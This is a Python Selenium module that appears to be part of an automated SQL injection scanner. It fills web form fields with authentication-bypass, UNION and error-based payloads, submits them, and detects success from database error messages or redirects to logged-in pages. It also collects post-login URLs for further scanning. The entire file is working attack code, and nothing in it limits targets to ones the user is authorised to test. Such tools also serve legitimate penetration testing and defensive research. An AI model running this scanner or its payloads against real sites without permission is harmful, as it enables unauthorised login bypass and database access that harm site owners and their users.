from selenium.webdriver.chrome.webdriver import WebDriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import re

# master list of injection types
SQL_ERROR_PATTERNS = [
    # MySQL
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL",

    # PostgreSQL
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",

    # Microsoft SQL Server
    r"Driver.*SQL[\-\_\ ]*Server",
    r"OLE DB.*SQL Server",
    r"(\W|\A)SQL Server.*Driver",
    r"Warning.*mssql_.*",
    r"Microsoft SQL Native Client error",

    # Oracle
    r"ORA-\d{4,5}",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_.*",
    r"Warning.*\Wora_.*",

    # SQLite
    r"SQLite\/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",

    # General SQL errors
    r"syntax error",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"SQL command not properly ended",
]

SQL_INJECTION_PAYLOADS = [
    # Basic authentication bypass
    ("' OR '1'='1", "Basic OR bypass"),
    ("' OR 1=1--", "Comment-based OR bypass"),
    ("admin'--", "Admin comment bypass"),
    ("' OR 'a'='a", "String comparison bypass"),

    # Extended bypasses
    ("1' OR '1'='1'--", "Numeric OR bypass with comment"),
    ("admin' OR '1'='1'/*", "Block comment bypass"),
    ("' OR '1'='1' #", "Hash comment bypass"),
    ("' OR '1'='1'--", "Double dash bypass"),

    # UNION-based
    ("' UNION SELECT NULL--", "UNION NULL test"),
    ("' UNION SELECT NULL, NULL--", "UNION double NULL test"),

    # Error-based
    ("'", "Single quote error test"),
    ("''", "Double quote test"),
    ("';", "Semicolon test"),
    ("' AND '1'='2", "False condition test"),
]


def detectSQLError(page_source: str) -> tuple[bool, str]:
    # looks for error messages
    for pattern in SQL_ERROR_PATTERNS:
        if re.search(pattern, page_source, re.IGNORECASE):
            return True, pattern
    return False, ""


def detectAuthenticationBypass(driver: WebDriver, original_url: str) -> bool:
    # check for bypassing auth
    current_url = driver.current_url

    # check if redirected to different page
    if current_url != original_url:
        bypass_indicators = [
            'dashboard', 'home', 'admin', 'panel', 'welcome',
            'profile', 'account', 'user', 'main', 'index'
        ]

        current_lower = current_url.lower()
        for indicator in bypass_indicators:
            if indicator in current_lower:
                return True

    # check page content for success indicators
    page_source = driver.page_source.lower()
    success_indicators = [
        'welcome', 'logout', 'log out', 'sign out',
        'dashboard', 'successfully logged in'
    ]

    for indicator in success_indicators:
        if indicator in page_source:
            return True

    return False


def findFieldElement(driver: WebDriver, field: dict):
    """Locate a field element in the DOM."""
    try:
        # Try by name first (most reliable)
        if field.get('name'):
            try:
                return driver.find_element(By.NAME, field['name'])
            except NoSuchElementException:
                pass

        # Try by ID
        if field.get('id'):
            try:
                return driver.find_element(By.ID, field['id'])
            except NoSuchElementException:
                pass

        # Try by class
        if field.get('class'):
            try:
                tag = field.get('tag', 'input')
                classes = field['class'].strip().split()
                selector = f"{tag}.{'.'.join(classes)}"
                return driver.find_element(By.CSS_SELECTOR, selector)
            except NoSuchElementException:
                pass

        return None

    except Exception:
        return None


def fillForm(driver: WebDriver, fields: list[dict], payload: str, target_field_index: int = 0) -> bool:
    # enter payload into the forms here
    filled_count = 0

    try:
        for idx, field in enumerate(fields):
            element = findFieldElement(driver, field)

            if not element:
                continue

            tag = field.get('tag', '').lower()
            field_type = field.get('type', '').lower()

            # Skip non-input elements
            if tag not in ['input', 'textarea', 'select']:
                continue

            # Skip buttons, checkboxes, etc.
            if field_type in ['submit', 'button', 'checkbox', 'radio', 'file']:
                continue

            # Clear and fill
            try:
                element.clear()
            except:
                pass

            if idx == target_field_index:
                element.send_keys(payload)
            else:
                # Dummy data based on field name
                field_name = (field.get('name') or '').lower()
                if 'email' in field_name:
                    element.send_keys('test@test.com')
                elif 'pass' in field_name:
                    element.send_keys('password123')
                elif 'user' in field_name:
                    element.send_keys('testuser')
                else:
                    element.send_keys('test')

            filled_count += 1

        return filled_count > 0

    except Exception:
        return False


def submitForm(driver: WebDriver, fields: list[dict]) -> bool:
    # click submit button
    try:
        # Find submit button in fields
        for field in fields:
            field_type = field.get('type', '').lower()

            if field_type == 'submit':
                element = findFieldElement(driver, field)
                if element:
                    element.click()
                    time.sleep(3)
                    return True

        # Try finding submit in form
        form_id = fields[0].get('form_id')
        if form_id and form_id != 'N/A':
            try:
                # Try by form name first
                try:
                    form = driver.find_element(By.CSS_SELECTOR, f"form[name='{form_id}']")
                except:
                    form = driver.find_element(By.ID, form_id)

                submit = form.find_element(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                submit.click()
                time.sleep(3)
                return True
            except:
                pass

        return False

    except Exception:
        return False


def testFormGroup(driver: WebDriver, fields: list[dict], form_id: str, headers: dict,
                  num_successful: int, url: str, successful_login_urls: list) -> tuple:
    results = []

    # Get form action URL
    form_action = fields[0].get('form_action', url)
    if form_action == 'N/A' or not form_action:
        form_action = url
    elif not form_action.startswith('http'):
        from urllib.parse import urljoin
        form_action = urljoin(url, form_action)


    # Test each injectable field
    for field_idx, field in enumerate(fields):
        field_name = field.get('name') or field.get('id') or f"field_{field_idx}"
        field_type = field.get('type', 'text').lower()

        # Skip non-injectable fields
        if field_type in ['submit', 'button', 'hidden', 'checkbox', 'radio', 'file']:
            continue

        # Test each payload on this field
        for payload, description in SQL_INJECTION_PAYLOADS:
            # Navigate back to original page
            driver.get(url)
            time.sleep(2)

            # create result entry
            result = {
                'form_id': form_id,
                'field_name': field_name,
                'field_type': field_type,
                'payload': payload,
                'origin_url': url,
                'form_action': form_action,
                'post_url': None,
                'cookies': driver.get_cookies(),
                'headers': headers,
                'success': False,
                'timestamp': time.time(),
                'allows_deeper_traversal': False  # only True if URL changes
            }

            # try to fill and submit form
            if not fillForm(driver, fields, payload, field_idx):
                results.append(result)
                continue

            original_url = driver.current_url

            if not submitForm(driver, fields):
                results.append(result)
                continue

            # get response details
            current_url = driver.current_url
            page_source = driver.page_source
            result['post_url'] = current_url

            # check for SQL errors
            sql_error, error_pattern = detectSQLError(page_source)
            if sql_error:
                result['success'] = True
                num_successful += 1

            # check for authentication bypass (requires URL change)
            auth_bypass = detectAuthenticationBypass(driver, original_url)
            if auth_bypass and current_url != original_url:
                result['success'] = True
                result['allows_deeper_traversal'] = True  # URL changed, can scan deeper
                num_successful += 1

                # Add the post-login URL for deeper scanning
                if current_url not in successful_login_urls:
                    successful_login_urls.append(current_url)

            results.append(result)

    return results, num_successful


def testStandaloneField(driver: WebDriver, field: dict, headers: dict, num_successful: int,
                        url: str, successful_login_urls: list) -> tuple:

    results = []
    field_name = field.get('name') or field.get('id') or 'unknown_field'
    field_type = field.get('type', 'text').lower()

    # Skip non-injectable fields
    if field_type in ['submit', 'button', 'hidden', 'checkbox', 'radio', 'file']:
        return results, num_successful

    for payload, description in SQL_INJECTION_PAYLOADS:
        driver.get(url)
        time.sleep(2)

        result = {
            'form_id': 'N/A',
            'field_name': field_name,
            'field_type': field_type,
            'payload': payload,
            'origin_url': url,
            'form_action': 'N/A',
            'post_url': None,
            'status_code': None,
            'cookies': driver.get_cookies(),
            'headers': headers,
            'success': False,
            'timestamp': time.time(),
            'allows_deeper_traversal': False
        }

        element = findFieldElement(driver, field)
        if not element:
            results.append(result)
            continue

        try:
            element.clear()
            element.send_keys(payload)
            element.send_keys(Keys.RETURN)
            time.sleep(3)

            original_url = url
            current_url = driver.current_url
            page_source = driver.page_source
            result['post_url'] = current_url

            try:
                # Execute JavaScript to get the response status
                status_code = driver.execute_script("return window.performance.getEntries()[0].responseStatus || 200")
                result['status_code'] = status_code
            except:
                # Fallback: assume 200 if we got a page
                result['status_code'] = 200 if page_source else None

            # Check for SQL errors
            sql_error, error_pattern = detectSQLError(page_source)
            if sql_error:
                result['success'] = True
                num_successful += 1

            # Check for authentication bypass (requires URL change)
            auth_bypass = detectAuthenticationBypass(driver, original_url)
            if auth_bypass and current_url != original_url:
                result['success'] = True
                result['allows_deeper_traversal'] = True
                num_successful += 1

                # Add the post-login URL for deeper scanning
                if current_url not in successful_login_urls:
                    successful_login_urls.append(current_url)

        except Exception as e:
            pass

        results.append(result)

    return results, num_successful


def groupForms(injection_fields: list[dict]) -> tuple[dict, list]:
    # group by form id
    form_fields = {}
    standalone_fields = []

    for field in injection_fields:
        form_id = field.get('form_id')

        if form_id != 'N/A':
            if form_id not in form_fields:
                form_fields[form_id] = []
            form_fields[form_id].append(field)
        else:
            standalone_fields.append(field)

    return form_fields, standalone_fields


def main(driver: WebDriver, injection_fields: list[dict], headers: dict, url: str) -> tuple:

    num_fields = len(injection_fields)
    num_successful = 0
    #original_cookies = driver.get_cookies()
    results = []
    successful_login_urls = []  # added to track URLs for deeper scanning

    # Group fields
    form_fields, standalone_fields = groupForms(injection_fields)

    # Test form-based fields
    for form_id, fields in form_fields.items():
        try:
            form_results, num_successful = testFormGroup(
                driver, fields, form_id, headers, num_successful, url, successful_login_urls
            )
            results.extend(form_results)
        except Exception as e:
            print(f"[!] Error testing form {form_id}: {e}")
            continue

    # Test standalone fields
    for field in standalone_fields:
        try:
            field_results, num_successful = testStandaloneField(
                driver, field, headers, num_successful, url, successful_login_urls
            )
            results.extend(field_results)
        except Exception as e:
            field_name = field.get('name') or field.get('id') or 'unknown'
            print(f"[!] Error testing standalone field {field_name}: {e}")
            continue

    # Determine if any vulnerabilities were found
    found_vulnerabilities = any(r['success'] for r in results)

    # Return the list of successful login URLs for recursive scanning
    return driver, found_vulnerabilities, num_fields, num_successful, results, successful_login_urls
